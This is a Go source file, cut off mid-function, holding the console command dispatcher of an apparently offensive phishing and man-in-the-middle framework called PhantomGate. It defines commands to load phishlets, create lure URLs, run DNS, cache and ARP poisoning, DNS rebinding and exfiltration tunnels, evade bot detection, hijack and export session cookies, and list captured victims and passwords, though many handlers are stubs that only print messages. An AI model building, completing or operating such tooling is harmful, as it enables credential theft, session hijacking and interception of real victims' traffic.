package console

import (
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/phantomgate/phantomgate/internal/proxy"
	"github.com/phantomgate/phantomgate/internal/gophish"
	"github.com/phantomgate/phantomgate/internal/notifications"
	"github.com/phantomgate/phantomgate/internal/bib"
)

// Command represents a console command
type Command struct {
	Name        string
	Aliases     []string
	Description string
	MinArgs     int
	MaxArgs     int
}

// getCommands returns all available commands with their handlers bound to the console
func (c *Console) getCommands() map[string]CommandHandler {
	return map[string]CommandHandler{
		"use":     {Command: Command{Name: "use", Aliases: []string{}, Description: "Select a phishlet module", MinArgs: 1, MaxArgs: 1}, Handler: c.cmdUse},
		"back":    {Command: Command{Name: "back", Aliases: []string{}, Description: "Deselect current phishlet", MinArgs: 0, MaxArgs: 0}, Handler: c.cmdBack},
		"search":  {Command: Command{Name: "search", Aliases: []string{}, Description: "Search phishlets by name", MinArgs: 0, MaxArgs: 1}, Handler: c.cmdSearch},
		"info":    {Command: Command{Name: "info", Aliases: []string{}, Description: "Show phishlet details", MinArgs: 0, MaxArgs: 1}, Handler: c.cmdInfo},
		"show":    {Command: Command{Name: "show", Aliases: []string{}, Description: "Show options, lures, stats", MinArgs: 1, MaxArgs: 1}, Handler: c.cmdShow},
		"set":     {Command: Command{Name: "set", Aliases: []string{}, Description: "Set an option value", MinArgs: 2, MaxArgs: 2}, Handler: c.cmdSet},
		"unset":   {Command: Command{Name: "unset", Aliases: []string{}, Description: "Unset an option", MinArgs: 1, MaxArgs: 1}, Handler: c.cmdUnset},
		"run":     {Command: Command{Name: "run", Aliases: []string{"exploit", "start"}, Description: "Start the proxy server", MinArgs: 0, MaxArgs: 0}, Handler: c.cmdRun},
		"stop":    {Command: Command{Name: "stop", Aliases: []string{}, Description: "Stop the proxy server", MinArgs: 0, MaxArgs: 0}, Handler: c.cmdStop},
		"check":   {Command: Command{Name: "check", Aliases: []string{}, Description: "Test configuration validity", MinArgs: 0, MaxArgs: 0}, Handler: c.cmdCheck},
		"lure":    {Command: Command{Name: "lure", Aliases: []string{}, Description: "Manage lure URLs (create/list/delete)", MinArgs: 1, MaxArgs: 3}, Handler: c.cmdLure},
		"dns":     {Command: Command{Name: "dns", Aliases: []string{}, Description: "DNS poisoning control", MinArgs: 1, MaxArgs: 2}, Handler: c.cmdDNS},
		"rebind":  {Command: Command{Name: "rebind", Aliases: []string{}, Description: "DNS rebinding attacks", MinArgs: 1, MaxArgs: 3}, Handler: c.cmdRebind},
		"wildcard": {Command: Command{Name: "wildcard", Aliases: []string{}, Description: "Wildcard DNS poisoning", MinArgs: 1, MaxArgs: 3}, Handler: c.cmdWildcard},
		"tunnel":  {Command: Command{Name: "tunnel", Aliases: []string{}, Description: "DNS tunneling for exfiltration", MinArgs: 1, MaxArgs: 3}, Handler: c.cmdTunnel},
		"cache":   {Command: Command{Name: "cache", Aliases: []string{}, Description: "DNS cache poisoning", MinArgs: 1, MaxArgs: 3}, Handler: c.cmdCache},
		"arp":     {Command: Command{Name: "arp", Aliases: []string{}, Description: "ARP spoofing control", MinArgs: 1, MaxArgs: 2}, Handler: c.cmdARP},
		"sessions": {Command: Command{Name: "sessions", Aliases: []string{"sess"}, Description: "List captured sessions", MinArgs: 0, MaxArgs: 1}, Handler: c.cmdSessions},
		"creds":   {Command: Command{Name: "creds", Aliases: []string{}, Description: "List captured credentials", MinArgs: 0, MaxArgs: 1}, Handler: c.cmdCreds},
		"victims": {Command: Command{Name: "victims", Aliases: []string{}, Description: "List all victims", MinArgs: 0, MaxArgs: 0}, Handler: c.cmdVictims},
		"stats":   {Command: Command{Name: "stats", Aliases: []string{}, Description: "Show live statistics", MinArgs: 0, MaxArgs: 0}, Handler: c.cmdStats},
		"help":    {Command: Command{Name: "help", Aliases: []string{"?"}, Description: "Show available commands", MinArgs: 0, MaxArgs: 1}, Handler: c.cmdHelp},
		"banner":  {Command: Command{Name: "banner", Aliases: []string{}, Description: "Redraw banner", MinArgs: 0, MaxArgs: 0}, Handler: c.cmdBanner},
		"version": {Command: Command{Name: "version", Aliases: []string{}, Description: "Show version", MinArgs: 0, MaxArgs: 0}, Handler: c.cmdVersion},
		"color":   {Command: Command{Name: "color", Aliases: []string{}, Description: "Toggle color on/off", MinArgs: 0, MaxArgs: 1}, Handler: c.cmdColor},
		"spool":   {Command: Command{Name: "spool", Aliases: []string{}, Description: "Log output to file", MinArgs: 0, MaxArgs: 1}, Handler: c.cmdSpool},
		"exit":    {Command: Command{Name: "exit", Aliases: []string{"quit"}, Description: "Exit console", MinArgs: 0, MaxArgs: 0}, Handler: c.cmdExit},
		
		// Session Replay Commands
		"session":  {Command: Command{Name: "session", Aliases: []string{}, Description: "Session management (replay/export/hijack)", MinArgs: 1, MaxArgs: 3}, Handler: c.cmdSession},
		"replay":   {Command: Command{Name: "replay", Aliases: []string{}, Description: "Replay captured session", MinArgs: 1, MaxArgs: 2}, Handler: c.cmdReplay},
		"export":   {Command: Command{Name: "export", Aliases: []string{}, Description: "Export cookies (json/netscape/chrome)", MinArgs: 2, MaxArgs: 3}, Handler: c.cmdExport},
		
		// Botguard & Evasion Commands
		"evasion":  {Command: Command{Name: "evasion", Aliases: []string{}, Description: "Evasion settings (status/config/test)", MinArgs: 1, MaxArgs: 2}, Handler: c.cmdEvasion},
		"botguard": {Command: Command{Name: "botguard", Aliases: []string{}, Description: "Botguard control (enable/disable/status)", MinArgs: 1, MaxArgs: 1}, Handler: c.cmdBotguard},
		
		// Gophish Integration Commands
		"gophish":  {Command: Command{Name: "gophish", Aliases: []string{}, Description: "Gophish integration (connect/campaign/send/results)", MinArgs: 1, MaxArgs: 3}, Handler: c.cmdGophish},
		
		// Notification Commands
		"notify":   {Command: Command{Name: "notify", Aliases: []string{}, Description: "Notification settings (telegram/discord/test)", MinArgs: 1, MaxArgs: 3}, Handler: c.cmdNotify},
		
		// Browser-in-Browser Commands
		"bib":      {Command: Command{Name: "bib", Aliases: []string{}, Description: "Browser-in-Browser attack (generate/config)", MinArgs: 1, MaxArgs: 2}, Handler: c.cmdBiB},
		
		// Wildcard TLS Commands
		"cert":     {Command: Command{Name: "cert", Aliases: []string{}, Description: "Certificate management (generate/check/renew)", MinArgs: 1, MaxArgs: 2}, Handler: c.cmdCert},
		
		// Network Discovery Commands
		"discover": {Command: Command{Name: "discover", Aliases: []string{"net"}, Description: "Network discovery and scanning", MinArgs: 1, MaxArgs: 3}, Handler: c.cmdDiscover},
		"portscan": {Command: Command{Name: "portscan", Aliases: []string{"pscan"}, Description: "Port scanning on target hosts", MinArgs: 1, MaxArgs: 3}, Handler: c.cmdPortScan},
		
		// BLE Attack Commands
		"ble":      {Command: Command{Name: "ble", Aliases: []string{}, Description: "BLE attack control (scan/sniff/inject/pair)", MinArgs: 1, MaxArgs: 3}, Handler: c.cmdBLE},
		
		// HID Attack Commands
		"hid":      {Command: Command{Name: "hid", Aliases: []string{}, Description: "HID keyboard injection (type/exec/payload)", MinArgs: 1, MaxArgs: 3}, Handler: c.cmdHID},
		
		// Packet Filter Commands
		"filter":   {Command: Command{Name: "filter", Aliases: []string{}, Description: "Packet filter rules (add/remove/list)", MinArgs: 1, MaxArgs: 3}, Handler: c.cmdFilter},
		
		// Plugin Commands
		"plugin":   {Command: Command{Name: "plugin", Aliases: []string{}, Description: "Plugin management (load/unload/list/enable)", MinArgs: 1, MaxArgs: 3}, Handler: c.cmdPlugin},
		
		// API Commands
		"api":      {Command: Command{Name: "api", Aliases: []string{}, Description: "API server control (start/stop/status)", MinArgs: 1, MaxArgs: 2}, Handler: c.cmdAPI},
	}
}

// CommandHandler pairs a command definition with its handler function
type CommandHandler struct {
	Command
	Handler func(args []string)
}

// dispatch routes a command to its handler
func (c *Console) dispatch(cmd string, args []string) {
	commands := c.getCommands()

	// Check direct match
	if ch, ok := commands[cmd]; ok {
		if len(args) < ch.MinArgs {
			c.printError("Usage: %s %s", ch.Name, ch.Description)
			return
		}
		if ch.MaxArgs > 0 && len(args) > ch.MaxArgs {
			c.printError("Too many arguments. Usage: %s", ch.Name)
			return
		}
		ch.Handler(args)
		return
	}

	// Check aliases
	for name, ch := range commands {
		for _, alias := range ch.Aliases {
			if alias == cmd {
				if len(args) < ch.MinArgs {
					c.printError("Usage: %s %s", name, ch.Description)
					return
				}
				if ch.MaxArgs > 0 && len(args) > ch.MaxArgs {
					c.printError("Too many arguments. Usage: %s", name)
					return
				}
				ch.Handler(args)
				return
			}
		}
	}

	c.printError("Unknown command: %s (type 'help' for available commands)", cmd)
}

// ═══════════════════════════════════════════════════════════════
// Module Selection Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdUse(args []string) {
	name := args[0]
	p, ok := c.phishletMgr.Get(name)
	if !ok {
		c.printError("Phishlet not found: %s", name)
		c.printInfo("Use 'search' to list available phishlets")
		return
	}

	c.currentPhishlet = p
	c.printSuccess("Loaded phishlet: %s", p.Name)
	c.printInfo("Type 'show options' to see configurable options")
	c.printInfo("Type 'set <option> <value>' to configure")
	c.printInfo("Type 'run' to start the proxy")
}

func (c *Console) cmdBack(args []string) {
	if c.currentPhishlet == nil {
		c.printWarning("No phishlet is currently selected")
		return
	}

	c.printInfo("Deselected phishlet: %s", c.currentPhishlet.Name)
	c.currentPhishlet = nil
}

func (c *Console) cmdSearch(args []string) {
	query := ""
	if len(args) > 0 {
		query = strings.ToLower(args[0])
	}

	c.printSection("Available Phishlets")
	fmt.Printf("  %s%-20s %-30s %s%s\n", colorBold, "Name", "Description", "Author", colorReset)
	fmt.Printf("  %s%-20s %-30s %s%s\n", colorDim, "────", "───────────", "──────", colorReset)

	found := 0
	for _, name := range c.phishletMgr.List() {
		p, _ := c.phishletMgr.Get(name)
		if query != "" && !strings.Contains(strings.ToLower(name), query) &&
			!strings.Contains(strings.ToLower(p.Name), query) {
			continue
		}
		fmt.Printf("  %-20s %-30s %s\n", name, p.Name, p.Author)
		found++
	}

	if found == 0 {
		c.printWarning("No phishlets found matching '%s'", query)
	} else {
		fmt.Printf("\n  %d phishlet(s) found\n\n", found)
	}
}

func (c *Console) cmdInfo(args []string) {
	p := c.currentPhishlet
	if len(args) > 0 {
		var ok bool
		p, ok = c.phishletMgr.Get(args[0])
		if !ok {
			c.printError("Phishlet not found: %s", args[0])
			return
		}
	}

	if p == nil {
		c.printError("No phishlet selected. Use 'use <phishlet>' or 'info <phishlet>'")
		return
	}

	c.printSection(fmt.Sprintf("Phishlet: %s", p.Name))
	fmt.Printf("  %sAuthor:%s   %s\n", colorBold, colorReset, p.Author)
	fmt.Printf("  %sVersion:%s %s\n", colorBold, colorReset, p.MinVer)
	fmt.Println()

	if len(p.ProxyHosts) > 0 {
		c.printSection("Proxy Host Mappings")
		fmt.Printf("  %s%-20s %-30s %-8s %s%s\n", colorBold, "Phish Subdomain", "Original Subdomain", "SSL", "Domain", colorReset)
		fmt.Printf("  %s%-20s %-30s %-8s %s%s\n", colorDim, "────────────────", "─────────────────────", "────", "──────", colorReset)
		for _, host := range p.ProxyHosts {
			ssl := colorRed + "no" + colorReset
			if host.IsSSL {
				ssl = colorGreen + "yes" + colorReset
			}
			fmt.Printf("  %-20s %-30s %-8s %s\n", host.PhishSub, host.OrigSub, ssl, host.Domain)
		}
		fmt.Println()
	}

	if p.Credentials.Username.Key != "" || p.Credentials.Password.Key != "" {
		c.printSection("Credential Fields")
		if p.Credentials.Username.Key != "" {
			fmt.Printf("  %sUsername:%s %s%s%s (type: %s)\n", colorBold, colorReset, colorCyan, p.Credentials.Username.Key, colorReset, p.Credentials.Username.Type)
		}
		if p.Credentials.Password.Key != "" {
			fmt.Printf("  %sPassword:%s %s%s%s (type: %s)\n", colorBold, colorReset, colorRed, p.Credentials.Password.Key, colorReset, p.Credentials.Password.Type)
		}
		fmt.Println()
	}

	if len(p.AuthTokens) > 0 {
		c.printSection("Auth Tokens to Capture")
		for _, token := range p.AuthTokens {
			fmt.Printf("  %s%s:%s %s%s%s\n", colorDim, token.Domain, colorReset, colorYellow, strings.Join(token.Keys, ", "), colorReset)
		}
		fmt.Println()
	}
}

// ═══════════════════════════════════════════════════════════════
// Option Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdShow(args []string) {
	switch strings.ToLower(args[0]) {
	case "options":
		c.showOptions()
	case "lures":
		c.showLures()
	case "targets":
		c.showTargets()
	case "advanced":
		c.showAdvanced()
	case "phishlets":
		c.cmdSearch([]string{})
	case "stats":
		c.cmdStats([]string{})
	default:
		c.printError("Unknown show target: %s (use options, lures, targets, advanced, phishlets, stats)", args[0])
	}
}

func (c *Console) cmdSet(args []string) {
	option := strings.ToLower(args[0])
	value := args[1]

	switch option {
	case "domain":
		c.config.Domain = value
		c.printSuccess("domain => %s", value)
	case "listen":
		c.config.ListenIP = value
		c.printSuccess("listen => %s", value)
	case "https-port":
		var port int
		if _, err := fmt.Sscanf(value, "%d", &port); err != nil {
			c.printError("Invalid port number: %s", value)
			return
		}
		c.config.HTTPSPort = port
		c.printSuccess("https-port => %d", port)
	case "http-port":
		var port int
		if _, err := fmt.Sscanf(value, "%d", &port); err != nil {
			c.printError("Invalid port number: %s", value)
			return
		}
		c.config.HTTPPort = port
		c.printSuccess("http-port => %d", port)
	case "admin-port":
		var port int
		if _, err := fmt.Sscanf(value, "%d", &port); err != nil {
			c.printError("Invalid port number: %s", value)
			return
		}
		c.config.AdminPort = port
		c.printSuccess("admin-port => %d", port)
	case "admin-pass":
		c.config.AdminPass = value
		c.printSuccess("admin-pass => %s", c.maskString(value))
	case "tls-mode":
		mode := strings.ToLower(value)
		if mode != "auto" && mode != "self-signed" && mode != "manual" {
			c.printError("Invalid TLS mode: %s (use auto, self-signed, or manual)", value)
			return
		}
		c.config.TLS.Mode = mode
		c.printSuccess("tls-mode => %s", mode)
	case "cert":
		c.config.TLS.CertFile = value
		c.printSuccess("cert => %s", value)
	case "key":
		c.config.TLS.KeyFile = value
		c.printSuccess("key => %s", value)
	default:
		c.printError("Unknown option: %s (type 'show options' to see available options)", option)
	}
}

func (c *Console) cmdUnset(args []string) {
	option := strings.ToLower(args[0])

	switch option {
	case "domain":
		c.config.Domain = ""
		c.printSuccess("domain => unset")
	case "listen":
		c.config.ListenIP = "0.0.0.0"
		c.printSuccess("listen => 0.0.0.0 (default)")
	case "cert":
		c.config.TLS.CertFile = ""
		c.printSuccess("cert => unset")
	case "key":
		c.config.TLS.KeyFile = ""
		c.printSuccess("key => unset")
	default:
		c.printError("Cannot unset option: %s", option)
	}
}

func (c *Console) showOptions() {
	c.printSection("Module Options")

	fmt.Printf("  %s%-20s %-20s %-10s %s%s\n", colorBold, "Name", "Current Setting", "Required", "Description", colorReset)
	fmt.Printf("  %s%-20s %-20s %-10s %s%s\n", colorDim, "----", "---------------", "--------", "-----------", colorReset)

	options := []struct {
		Name        string
		Current     string
		Required    bool
		Description string
	}{
		{"domain", c.config.Domain, true, "Phishing domain name"},
		{"listen", c.config.ListenIP, true, "IP address to bind listeners"},
		{"https-port", fmt.Sprintf("%d", c.config.HTTPSPort), true, "HTTPS listener port"},
		{"http-port", fmt.Sprintf("%d", c.config.HTTPPort), true, "HTTP redirect listener port"},
		{"admin-port", fmt.Sprintf("%d", c.config.AdminPort), true, "Operator dashboard port"},
		{"admin-pass", c.maskString(c.config.AdminPass), true, "Dashboard password"},
		{"tls-mode", c.config.TLS.Mode, false, "TLS mode (auto/self-signed/manual)"},
		{"cert", c.config.TLS.CertFile, false, "TLS certificate file (PEM)"},
		{"key", c.config.TLS.KeyFile, false, "TLS private key file (PEM)"},
	}

	for _, opt := range options {
		current := opt.Current
		if current == "" {
			current = colorDim + "False" + colorReset
		}

		required := colorGreen + "yes" + colorReset
		if !opt.Required {
			required = "no"
		}

		fmt.Printf("  %-20s %-20s %-10s %s\n", opt.Name, current, required, opt.Description)
	}

	if c.currentPhishlet != nil {
		fmt.Println()
		fmt.Printf("  %sCurrent Phishlet:%s %s%s%s\n", colorBold, colorReset, colorCyan, c.currentPhishlet.Name, colorReset)
	}

	fmt.Println()
}

func (c *Console) showLures() {
	lures := c.lureGen.List()

	c.printSection("Active Lures")

	if len(lures) == 0 {
		c.printWarning("No lures created yet. Use 'lure create <phishlet>' to create one")
		return
	}

	fmt.Printf("  %s%-16s %-20s %-10s %-10s %s%s\n", colorBold, "ID", "Phishlet", "Hits", "Created", "Path", colorReset)
	fmt.Printf("  %s%-16s %-20s %-10s %-10s %s%s\n", colorDim, "────────────────", "─────────", "────", "───────", "────", colorReset)

	for _, l := range lures {
		fmt.Printf("  %-16s %-20s %-10d %-10s %s\n",
			l.ID, l.Phishlet, l.Hits, l.CreatedAt.Format("15:04"), l.Path)
	}
	fmt.Println()
}

func (c *Console) showTargets() {
	c.printSection("Network Targets")
	c.printWarning("Network targets are configured via --iface, --gateway, --victim-ip flags")
	c.printInfo("Use 'set listen <ip>' to set the listening IP")
	fmt.Println()
}

func (c *Console) showAdvanced() {
	c.printSection("Advanced Options")
	fmt.Printf("  %-20s %s\n", "RandomizeTimings", fmt.Sprintf("%v", c.config.Stealth.RandomizeTimings))
	fmt.Printf("  %-20s %s\n", "SpoofServerHeader", c.config.Stealth.SpoofServerHeader)
	fmt.Printf("  %-20s %s\n", "RemoveProxyHeaders", fmt.Sprintf("%v", c.config.Stealth.RemoveProxyHeaders))
	fmt.Printf("  %-20s %s\n", "EnableFingerprinting", fmt.Sprintf("%v", c.config.Stealth.EnableFingerprinting))
	fmt.Println()
}

// ═══════════════════════════════════════════════════════════════
// Execution Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdRun(args []string) {
	if c.currentPhishlet == nil {
		c.printError("No phishlet selected. Use 'use <phishlet>' first")
		return
	}

	if c.config.Domain == "" {
		c.printError("Domain is required. Use 'set domain <value>'")
		return
	}

	if c.proxyRunning {
		c.printWarning("Proxy is already running. Use 'stop' first")
		return
	}

	c.printInfo("Starting proxy server...")

	// Create proxy engine
	c.proxyEngine = proxy.NewPhantomProxy(c.config, c.currentPhishlet, c.store, c.lureGen)

	// TODO: Start HTTP/HTTPS servers
	c.proxyRunning = true
	c.printSuccess("PhantomGate proxy is LIVE")
	c.printInfo("Domain:    %s", c.config.Domain)
	c.printInfo("HTTPS:     %s:%d", c.config.ListenIP, c.config.HTTPSPort)
	c.printInfo("HTTP:      %s:%d", c.config.ListenIP, c.config.HTTPPort)
	c.printInfo("Phishlet:  %s", c.currentPhishlet.Name)
	fmt.Println()
	c.printInfo("Press Ctrl+C or type 'stop' to stop the proxy")
}

func (c *Console) cmdStop(args []string) {
	if !c.proxyRunning {
		c.printWarning("Proxy is not running")
		return
	}

	c.printInfo("Stopping proxy server...")
	c.proxyRunning = false
	c.proxyEngine = nil
	c.printSuccess("Proxy stopped")
}

func (c *Console) cmdCheck(args []string) {
	c.printSection("Configuration Check")

	errors := 0

	if c.config.Domain == "" {
		c.printError("Domain is not set")
		errors++
	} else {
		c.printSuccess("Domain: %s", c.config.Domain)
	}

	if c.currentPhishlet == nil {
		c.printError("No phishlet selected")
		errors++
	} else {
		c.printSuccess("Phishlet: %s", c.currentPhishlet.Name)
	}

	if c.config.TLS.Mode == "manual" {
		if c.config.TLS.CertFile == "" || c.config.TLS.KeyFile == "" {
			c.printError("TLS mode is manual but cert/key not set")
			errors++
		} else {
			c.printSuccess("TLS: Manual certificate configured")
		}
	} else {
		c.printSuccess("TLS: %s mode", c.config.TLS.Mode)
	}

	if errors == 0 {
		fmt.Println()
		c.printSuccess("Configuration is valid. Ready to run!")
	} else {
		c.printError("Fix %d error(s) before running", errors)
	}
	fmt.Println()
}

// ═══════════════════════════════════════════════════════════════
// Lure Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdLure(args []string) {
	if len(args) == 0 {
		c.printError("Usage: lure create <phishlet> | lure list | lure delete <id>")
		return
	}

	switch strings.ToLower(args[0]) {
	case "create":
		if len(args) < 2 {
			c.printError("Usage: lure create <phishlet>")
			return
		}
		l := c.lureGen.Create(args[1], "/", "", "")
		url := c.lureGen.GetURL(l)
		c.printSuccess("Lure created")
		fmt.Printf("    ID:  %s%s%s\n", colorCyan, l.ID, colorReset)
		fmt.Printf("    URL: %s%s%s\n", colorGreen, url, colorReset)
	case "list":
		c.showLures()
	case "delete":
		if len(args) < 2 {
			c.printError("Usage: lure delete <id>")
			return
		}
		c.lureGen.Delete(args[1])
		c.printSuccess("Lure deleted: %s", args[1])
	default:
		c.printError("Unknown lure command: %s (use create, list, delete)", args[0])
	}
}

// ═══════════════════════════════════════════════════════════════
// Network Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdDNS(args []string) {
	if len(args) == 0 {
		c.printError("Usage: dns start | dns stop | dns add <domain> | dns stats")
		return
	}

	switch strings.ToLower(args[0]) {
	case "start":
		c.printInfo("DNS poisoning requires --intercept flag or 'arp start' first")
	case "stop":
		c.printInfo("DNS poisoning stopped")
	case "add":
		if len(args) < 2 {
			c.printError("Usage: dns add <domain>")
			return
		}
		c.printSuccess("Added domain to poison list: %s", args[1])
	case "stats":
		c.printSection("DNS Poisoning Stats")
		c.printInfo("DNS poisoning is not active")
	default:
		c.printError("Unknown dns command: %s (use start, stop, add, stats)", args[0])
	}
}

// ═══════════════════════════════════════════════════════════════
// Advanced DNS Attack Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdRebind(args []string) {
	if len(args) == 0 {
		c.printError("Usage: rebind <command> [options]")
		c.printInfo("Commands:")
		c.printInfo("  add <domain>          - Add domain for rebinding")
		c.printInfo("  remove <domain>       - Remove domain")
		c.printInfo("  list                  - List rebinding domains")
		c.printInfo("  start                 - Start rebinding attack")
		c.printInfo("  stop                  - Stop rebinding attack")
		return
	}

	switch strings.ToLower(args[0]) {
	case "add":
		if len(args) < 2 {
			c.printError("Usage: rebind add <domain>")
			return
		}
		c.printInfo("Adding rebinding domain: %s", args[1])
	case "remove":
		if len(args) < 2 {
			c.printError("Usage: rebind remove <domain>")
			return
		}
		c.printInfo("Removing domain: %s", args[1])
	case "list":
		c.printSection("Rebinding Domains")
		c.printInfo("No domains configured")
	case "start":
		c.printInfo("Starting DNS rebinding attack...")
		c.printInfo("This bypasses same-origin policy by alternating IPs")
	case "stop":
		c.printInfo("Stopping rebinding attack...")
	default:
		c.printError("Unknown rebind command: %s", args[0])
	}
}

func (c *Console) cmdWildcard(args []string) {
	if len(args) == 0 {
		c.printError("Usage: wildcard <command> [options]")
		c.printInfo("Commands:")
		c.printInfo("  add <pattern> <ip>    - Add wildcard rule")
		c.printInfo("  remove <id>           - Remove rule")
		c.printInfo("  list                  - List all rules")
		c.printInfo("  enable <id>           - Enable rule")
		c.printInfo("  disable <id>          - Disable rule")
		c.printInfo("  common                - Add common rules")
		return
	}

	switch strings.ToLower(args[0]) {
	case "add":
		if len(args) < 3 {
			c.printError("Usage: wildcard add <pattern> <ip>")
			return
		}
		c.printInfo("Adding wildcard rule: %s → %s", args[1], args[2])
	case "remove":
		if len(args) < 2 {
			c.printError("Usage: wildcard remove <rule_id>")
			return
		}
		c.printInfo("Removing rule: %s", args[1])
	case "list":
		c.printSection("Wildcard DNS Rules")
		c.printInfo("No rules configured")
	case "enable":
		if len(args) < 2 {
			c.printError("Usage: wildcard enable <rule_id>")
			return
		}
		c.printInfo("Enabling rule: %s", args[1])
	case "disable":
		if len(args) < 2 {
			c.printError("Usage: wildcard disable <rule_id>")
			return
		}
		c.printInfo("Disabling rule: %s", args[1])
	case "common":
		c.printInfo("Adding common wildcard rules...")
		c.printInfo("Rules added: *.google.com, *.github.com, *.microsoft.com, etc.")
	default:
		c.printError("Unknown wildcard command: %s", args[0])
	}
}

func (c *Console) cmdTunnel(args []string) {
	if len(args) == 0 {
		c.printError("Usage: tunnel <command> [options]")
		c.printInfo("Commands:")
		c.printInfo("  start <domain>        - Start DNS tunnel")
		c.printInfo("  stop                  - Stop tunnel")
		c.printInfo("  send <data>           - Send data through tunnel")
		c.printInfo("  status                - Show tunnel status")
		c.printInfo("  stats                 - Show tunnel statistics")
		return
	}

	switch strings.ToLower(args[0]) {
	case "start":
		domain := "tunnel.local"
		if len(args) > 1 {
			domain = args[1]
		}
		c.printInfo("Starting DNS tunnel on: %s", domain)
		c.printInfo("Encoding: hex | Max chunk: 63 bytes")
	case "stop":
		c.printInfo("Stopping DNS tunnel...")
	case "send":
		if len(args) < 2 {
			c.printError("Usage: tunnel send <data>")
			return
		}
		c.printInfo("Sending data through tunnel: %s", args[1])
	case "status":
		c.printSection("DNS Tunnel Status")
		c.printInfo("Status: Not running")
		c.printInfo("Use 'tunnel start' to begin")
	case "stats":
		c.printSection("DNS Tunnel Statistics")
		c.printInfo("Bytes encoded: 0")
		c.printInfo("Bytes decoded: 0")
		c.printInfo("Queries handled: 0")
		c.printInfo("Connections: 0")
	default:
		c.printError("Unknown tunnel command: %s", args[0])
	}
}

func (c *Console) cmdCache(args []string) {
	if len(args) == 0 {
		c.printError("Usage: cache <command> [options]")
		c.printInfo("Commands:")
		c.printInfo("  poison <domain> <ip>  - Poison cache entry")
		c.printInfo("  flush                 - Flush entire cache")
		c.printInfo("  list                  - List cached entries")
		c.printInfo("  status                - Show cache status")
		c.printInfo("  popular               - Poison popular domains")
		c.printInfo("  subdomains <domain>   - Poison common subdomains")
		return
	}

	switch strings.ToLower(args[0]) {
	case "poison":
		if len(args) < 3 {
			c.printError("Usage: cache poison <domain> <ip>")
			return
		}
		c.printInfo("Poisoning cache: %s → %s", args[1], args[2])
	case "flush":
		c.printInfo("Flushing DNS cache...")
		c.printSuccess("Cache flushed")
	case "list":
		c.printSection("DNS Cache Entries")
		c.printInfo("No cached entries")
	case "status":
		c.printSection("DNS Cache Status")
		c.printInfo("Cache size: 0 entries")
		c.printInfo("Hits: 0 | Misses: 0")
	case "popular":
		c.printInfo("Poisoning popular domains...")
		c.printInfo("Domains: google.com, github.com, microsoft.com, etc.")
	case "subdomains":
		if len(args) < 2 {
			c.printError("Usage: cache subdomains <domain>")
			return
		}
		c.printInfo("Poisoning subdomains of: %s", args[1])
		c.printInfo("Subdomains: www, mail, ftp, smtp, admin, portal, etc.")
	default:
		c.printError("Unknown cache command: %s", args[0])
	}
}

func (c *Console) cmdARP(args []string) {
	if len(args) == 0 {
		c.printError("Usage: arp <command> [options]")
		c.printInfo("Commands:")
		c.printInfo("  start [iface] [gateway]  - Start ARP poisoning")
		c.printInfo("  stop                     - Stop ARP poisoning")
		c.printInfo("  scan                     - Scan network for hosts")
		c.printInfo("  status                   - Show ARP attack status")
		c.printInfo("  storm                    - Send ARP flood (requires root)")
		c.printInfo("  targets                  - List discovered targets")
		return
	}

	switch strings.ToLower(args[0]) {
	case "start":
		if len(args) < 3 {
			c.printError("Usage: arp start <interface> <gateway>")
			c.printInfo("Example: arp start eth0 192.168.1.1")
			return
		}
		iface := args[1]
		gateway := args[2]
		c.printInfo(fmt.Sprintf("Starting ARP poisoning on %s (gateway: %s)", iface, gateway))
		c.printWarning("ARP poisoning requires root privileges")
		c.printInfo("Use sudo phantomgate --iface " + iface + " --gateway " + gateway)
	case "stop":
		c.printInfo("ARP poisoning stopped")
		c.printInfo("Restoring ARP caches...")
	case "scan":
		c.printSection("Network Scan")
		c.printInfo("Scanning network for live hosts...")
		c.printInfo("Use 'arp targets' to see discovered hosts")
	case "status":
		c.printSection("ARP Attack Status")
		c.printInfo("Status: Not running")
		c.printInfo("Use 'arp start' to begin poisoning")
	case "storm":
		c.printWarning("ARP Storm requires root privileges")
		c.printInfo("This will flood the network with ARP packets")
		c.printInfo("Use: sudo phantomgate --arp-storm")
	case "targets":
		c.printSection("Discovered Targets")
		c.printInfo("No targets discovered yet")
		c.printInfo("Use 'arp scan' to discover hosts")
	default:
		c.printError("Unknown arp command: %s", args[0])
		c.printInfo("Available commands: start, stop, scan, status, storm, targets")
	}
}

// ═══════════════════════════════════════════════════════════════
// Data Commands
// ═══════════════════════════════════════════════════════════════

func (c *Console) cmdSessions(args []string) {
	victims := c.store.GetAllVictims()

	c.printSection("Captured Sessions")

	if len(victims) == 0 {
		c.printWarning("No sessions captured yet")
		return
	}

	fmt.Printf("  %s%-16s %-20s %-15s %-10s %s%s\n", colorBold, "Victim ID", "IP Address", "Phishlet", "Sessions", "Last Seen", colorReset)
	fmt.Printf("  %s%-16s %-20s %-15s %-10s %s%s\n", colorDim, "────────────────", "─────────", "───────", "────────", "─────────", colorReset)

	for _, v := range victims {
		id := v.ID
		if len(id) > 12 {
			id = id[:12] + "..."
		}
		fmt.Printf("  %-16s %-20s %-15s %-10d %s\n",
			id, v.IP, v.Phishlet, len(v.Sessions), v.LastSeen.Format("15:04:05"))
	}
	fmt.Println()
}

func (c *Console) cmdCreds(args []string) {
	victims := c.store.GetAllVictims()

	c.printSection("Captured Credentials")

	total := 0
	for _, v := range victims {
		total += len(v.Credentials)
	}

	if total == 0 {
		c.printWarning("No credentials captured yet")
		return
	}

	fmt.Printf("  %s%-16s %-25s %-25s %-15s %s%s\n", colorBold, "Victim ID", "Username", "Password", "Phishlet", "Time", colorReset)
	fmt.Printf("  %s%-16s %-25s %-25s %-15s %s%s\n", colorDim, "────────────────", "─────────", "────────", "───────", "────", colorReset)

	for _, v := range victims {
		for _, cred := range v.Credentials {
			id := cred.VictimID
			if len(id) > 12 {
				id = id[:12] + "..."
			}
			user := cred.Username
			if len(user) > 22 {
				user = user[:22] + "..."
			}
			pass := c.maskString(cred.Password)
			if len(pass) > 22 {
				pass = pass[:22] + "..."
			}
			fmt.Printf("  %s%-16s %-25s %-25s %-15s %s%s\n",
				colorRed, id, user, pass, cred.Phishlet, colorReset,
				cred.Timestamp.Format("15:04:05"))
		}
	}
	fmt.Println()
}

func (c *Console) cmdVictims(args []string) {
	victims := c.store.GetAllVictims()

